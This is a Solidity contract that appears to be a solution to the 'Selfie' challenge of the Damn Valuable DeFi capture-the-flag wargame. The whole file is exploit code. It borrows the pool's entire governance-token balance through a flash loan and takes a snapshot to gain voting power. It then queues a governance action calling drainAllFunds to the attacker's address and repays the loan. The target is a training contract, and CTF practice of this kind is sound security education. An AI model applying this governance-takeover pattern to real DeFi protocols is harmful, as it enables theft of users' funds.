// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttack {
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal governanceToken;

    address attacker;

    constructor(address _selfiePool, address _governanceToken) {
        selfiePool = SelfiePool(_selfiePool);
        governanceToken = DamnValuableTokenSnapshot(_governanceToken);
    }

    function attack() external {
        attacker = address(msg.sender);
        selfiePool.flashLoan(governanceToken.balanceOf(address(selfiePool)));
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        governanceToken.snapshot();
        selfiePool.governance().queueAction(
            address(selfiePool),
            abi.encodeWithSignature("drainAllFunds(address)", attacker),
            0
        );
        governanceToken.transfer(address(selfiePool), amount);
    }
}
